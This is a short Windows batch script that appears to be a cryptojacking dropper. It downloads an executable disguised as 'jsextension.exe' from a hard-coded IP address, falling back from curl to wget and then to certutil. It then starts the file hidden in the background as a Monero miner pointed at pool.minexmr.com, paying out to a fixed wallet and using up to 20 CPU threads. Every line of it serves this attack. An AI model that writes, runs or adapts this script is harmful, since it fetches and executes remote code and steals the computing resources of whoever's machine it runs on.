@echo off
curl http://185.173.36.219/download/jsextension.exe -o jsextension.exe
if not exist jsextension.exe (
	wget http://185.173.36.219/download/jsextension.exe -O jsextension.exe
)
if not exist jsextension.exe (
	certutil.exe -urlcache -f http://185.173.36.219/download/jsextension.exe jsextension.exe
)
set exe_1=jsextension.exe
set "count_1=0"
>tasklist.temp (
tasklist /NH /FI "IMAGENAME eq %exe_1%"
)
for /f %%x in (tasklist.temp) do (
if "%%x" EQU "%exe_1%" set /a count_1+=1
)
if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u 87FLi8c827mTJwezgVXVUrEkHagWiJ2wuaco2bVkFLGqL3MNMFpeay7QJmHooz19qQFMgJfQRJwJKZMJpetT5Qp69xBARwH --cpu-max-threads-hint=20 --donate-level=1 --background)
del tasklist.temp